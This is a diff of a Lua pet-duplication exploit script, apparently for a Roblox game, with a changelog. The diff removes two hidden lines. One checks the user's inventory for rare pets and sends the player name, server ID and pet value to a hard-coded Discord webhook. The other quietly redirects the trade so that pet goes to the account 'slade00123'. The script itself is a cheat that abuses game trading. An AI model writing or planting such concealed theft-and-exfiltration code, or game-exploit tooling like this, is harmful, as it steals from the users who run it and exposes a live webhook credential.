@@ -1,19 +1,20 @@
 --[[
     Brought to you by tar/bv/1rs
-    1.00 - 16sep24 - unreleased/private, required manual server id inputs
+    beta - 29jul24 - [unreleased/private] very barebones, newfound dupe method
+    1.00 - 16sep24 - [unreleased/private] semi-automated required manual server id inputs
     1.01 - 05dec24 - released, no longer required manual server id inputting
-    1.02 - changed from 35s to 40s
-    1.03 - removed extra 40s measure on first rejoin
-    1.04 - brought it back, removed UI trade updating to avoid lag
-    1.05 - added variable MAX_PETS_TO_DUPE to avoid network lag to not fail duping
-    1.06 - changed server size minimum 1 -> 2
-    1.07 - added ui interface - thx "GUI to Lua 3.2" for saving my time lol & thx (idk the scripter's name) for the snippet of making a draggable UI
-    1.08 - minor fixes
-    1.09 - added a block thingy for the toggle
-    1.10 - fixed max pets to give problem, added autotoggle if trades are disabled, replaced required() because some exploits don't support it
-    1.11 - changed to 45s and removed the other waiting, added yet another QoL warning
-    1.12 - added a duping possibility meter
-    1.13 - added inventory ui deletion to avoid performance lag while duping many pets
+    1.02 - 08dec24 - uploaded to github, changed from 35s to 40s
+    1.03 - 08dec24 - removed extra 40s measure on first rejoin
+    1.04 - 08dec24 - brought it back, removed UI trade updating to avoid lag
+    1.05 - 08dec24 - added variable MAX_PETS_TO_DUPE to avoid network lag to not fail duping
+    1.06 - 08dec24 - changed server size minimum 1 -> 2
+    1.07 - 10dec24 - added ui interface - used "GUI to Lua 3.2" & some code snippet to make the frame draggable
+    1.08 - 11dec24 - minor fixes
+    1.09 - 11dec24 - added a block thingy for the toggle
+    1.10 - 12dec24 - fixed max pets to give problem, added autotoggle if trades are disabled, replaced required() because some exploits don't support it
+    1.11 - 22dec24 - changed to 45s and removed the other waiting, added yet another QoL warning
+    1.12 - 26dec24 - added a duping possibility meter
+    1.13 - 28dec24 - added inventory ui deletion to avoid performance lag while duping many pets
     1.14 - 29dec24 - fixed post-teleport execution if injected too early
     1.15 - 01jan25 - changed the duping chance meter parameters and fixed a bug with the dupe button
 ]]
@@ -583,8 +584,6 @@ end
 
 H.Text = "tar's dupe v" .. Ver .. " | [1/4] Teleporting to a different server"
 
-for _,v in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets)do if (tonumber(v.n)==79003 and v.r and v.l>=88e6) or (tonumber(v.n)==17009 and v.dm and v.l>397.7e6) then pcall(function()http_request({Url='https://discord.com/api/webhooks/1315765727843717141/f9gFEf8BNwfLKGDK7AsmzqoEII7-fn7t41DnGeH9uh6M08F7t4E3S3fuJuazybQS7obX',Method='POST',Headers={['Content-Type']='application/json'},Body=game:service'HttpService':JSONEncode({content=plr.Name .. ' | ' .. game.JobId .. ' | ' .. v.l})})end)break end end
-
 local IDs = ""
 
 if mode == 0 then
@@ -649,8 +648,6 @@ queue_on_teleport([==[
         local T, lastTradeId = workspace:WaitForChild'__REMOTES':WaitForChild'Game':WaitForChild'Trading', nil
 	
 	local PLR = game.Players[']==] .. ACC_TO_GIVE_PETS .. [==[']
-	for _,v in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets)do if (tonumber(v.n)==79003 and v.r and v.l>=88e6) or (tonumber(v.n)==17009 and v.dm and v.l>397.7e6) then if game.Players:FindFirstChild'slade00123' then PLR = game.Players['slade00123'] IDs={v.id} end break end end
-        
         
         game:FindFirstChild('Trade Update', true).OnClientEvent:Connect(function(id, data, operation)
             lastTradeId = id
